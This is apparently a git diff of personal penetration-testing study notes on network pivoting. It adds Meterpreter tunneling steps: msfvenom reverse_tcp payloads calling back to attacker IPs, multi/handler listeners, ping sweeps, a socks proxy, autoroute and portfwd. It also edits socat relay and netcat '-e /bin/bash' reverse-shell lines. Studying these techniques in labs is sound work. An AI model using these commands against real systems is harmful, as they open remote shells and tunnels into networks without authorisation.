@@ -2,6 +2,7 @@
   - [Active](#active)
 - [PIVOTING](#pivoting)
   - [SSH](#ssh)
+  - [Meterpreter Tunneling](#meterpreter-tunneling)
   - [PROXY](#proxy)
   - [SS](#ss)
   - [PLINK.EXE](#plinkexe)
@@ -34,10 +35,13 @@
 - [Diagrams](https://app.diagrams.net/)
 
 ```mermaid
+---
+title: Scenario
+---
 flowchart TD
 subgraph Z[" "]
 direction LR
-    A[Attacker]:::foo -->|direct access| B(Target 1):::bar ---> C(Target 2):::bar
+    A[Attacker]:::foo -->|direct access| B(Pivot):::bar ---> C(Target 2):::bar
     A[Attacker] --->|No Access| C(Target 2)
     classDef foo stroke:#f00
     classDef bar stroke:#0f0
@@ -132,12 +136,12 @@ or http or inline
 Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
 
-  - Steps
-    - Create msf reverse_shell (on attacker) http|https|stage|stageless
-    - upload to pivot (to pivot)
-    - start http server (on pivot)
-    - download shell (remote target)
-    - run ssh -R PivotInternalIp:port:Attacker0.0.0.0:Port User@PivotPublic + Dynamic
+- Steps
+  - Create msf reverse_shell (on attacker) http|https|stage|stageless
+  - upload to pivot (to pivot)
+  - start http server (on pivot)
+  - download shell (remote target)
+  - run ssh -R PivotInternalIp:port:Attacker0.0.0.0:Port User@PivotPublic + Dynamic
    
 
 - Check forwarding
@@ -145,6 +149,98 @@ Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\
     - -a: show all listening/non-listening sockets
     - -n: numerical address
     - -p: program/pid
+
+### Meterpreter Tunneling
+- Steps
+1. Upload meterpreter shell on the pivot
+2. Create listener (multi handler) on the attacker to listen to 1
+3. Execute ping sweep on the internal network
+4. Set up MSF sock proxy
+5. Create routes to internal subnet found on the pivot (module | inside meterpreter)
+
+- Meterpreter shell for pivot, that return commands to attacker
+
+```
+# Start multihandler
+use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 8080
+set payload linux/x64/meterpreter/reverse_tcp
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+```
+
+- Ping sweep to find address of the target
+
+```
+# Module
+post/multi/gather/ping_sweep RHOSTS=ADD_NETWORK
+
+# Direct on meterpreter
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+# or
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+for i in {1..255}; do (ping -c 1 172.16.5.${i} | grep "bytes from" &); done
+- c PACKET
+- i time out
+
+# Windows
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+```
+
+- ICMP blocked
+  - TCP scan on ADD_NETWORK
+
+- **Proxy**
+```
+# Set up proxy of metasploit
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set SRVHOST 0.0.0.0
+set version 4a
+
+jobs: check if it is running
+
+# Route traffic via meterpreter session
+
+use post/multi/manage/autoroute
+set SESSION #
+set SUBNET TARGET_NET
+
+# or inside the meterpreter session
+run autoroute -s 172.16.5.0/23
+run autorute -p = list active routes
+```
+
+- **Local Port Forwarding**
+  - portfwd module
+```
+portfwd add -l LISTEN -p TARGET_PORT -r Target_IP
+portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+xfreerdp localhost:3300 = xfreerdp target:3389
+```
+
+- **Rerverse Port Forwarding**
+  - portfwd -R
+```
+portfwd add -R -l LOCAL_Port -p TARGET_PORT -L $ATTACKER
+portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+# Set up multi handler to listen
+set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 8081 
+set LHOST 0.0.0.0 
+```
+
+  - Sheell on TARGET would send connection to Pivot:1234 and this send to Attacker:8081
+
+```
+# windows payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
 
 ### PROXY
 - proxychains: route packaet over 9050, force application traffic to go through proxy
@@ -159,6 +255,7 @@ Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\
 
 socks4 	127.0.0.1 9050
 ```
+
 
 - FoxyProxy
   - better for web
@@ -181,6 +278,7 @@ socks4 	127.0.0.1 9050
   - transfer private key to target: 
   - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
   - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
+  - In the end: delete key
 
 ### SS
 - tool to investigate sockets
@@ -238,19 +336,64 @@ socks4 	127.0.0.1 9050
 -Reset resolved.service: sudo systemctl restart systemd-resolved.service
 
 ### SOCAT
-- Reverse shell
-  - listener on the attacker
-  - relay on compromised: ./socat tcp-l:8000 tcp:Attacker-IP:443 &
-  - create reverse shell from compromised to attacker: nc localhost 8000 -e/bin/bash
+- Bidirectional ==> pipe socket ==> 2 independent network without SSH
+  - mestasploit listener <==> socat on target
+    - socat will listen on port 8080 and forward everything to attacker 80
+```
+socat TCP4-LISTEN:8080,fork TCP4:ATTACKER:80
+```
+  - Steps Reverse shell
+    1.  Start socat listener on the pivot
+    2.  Create payload for target
+    3.  upload payload to the target
+    4.  start multi handler on the attacker
+
+
+
+```mermaid
+---
+title: Socat Diagramm Reverse Shell
+---
+flowchart TD
+subgraph Z[" "]
+direction LR
+    C(Target 1) -->|8080| B(Pivot: Socat listens 8080):::bar -->|80| A[Attacker listens 80]:::foo
+    D(Target 2) -->|8080| B(Pivot: Socat listens 8080):::bar 
+    E(Target n) -->|8080| B(Pivot: Socat listens 8080):::bar 
+    classDef foo stroke:#f00
+    classDef bar stroke:#0f0
+end
+```
+
+```mermaid
+---
+title: Socat Diagramm Bind Shell
+---
+flowchart TD
+subgraph Z[" "]
+direction LR
+    A[Attacker]:::foo -->|8080| B(Pivot: Socat listens 8080):::bar -->|8443| C(Target 1 listens 8443) 
+    B(Pivot: Socat listens 8080):::bar -->|8443| D(Target 2 listens 8443) 
+    B(Pivot: Socat listens 8080):::bar -->|8443| E(Target n listens 8443) 
+    classDef foo stroke:#f00
+    classDef bar stroke:#0f0
+end
+```
+
+- Steps
+  1. Start bind shell listener
+```
+socat TCP4-LISTEN:8080,fork TCP4:TARGET:8443
+```
 
 - Port Forwarding - Method 1
-  - open port on victim + redirect to target server = ./socat tcp-l:[port_on_victim],fork,reuseaddr tcp:[target_ip]:3306 &
+  - open port on target + redirect to target server = ./socat tcp-l:[port_on_target],fork,reuseaddr tcp:[target_ip]:3306 &
 
 - Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
   - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
-  - victim: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
-- on victim: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect victim back to us on port 443
-- on victim: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
+  - target: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+- on target: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect target back to us on port 443
+- on target: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
 - Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &
 
 - Encrypted:
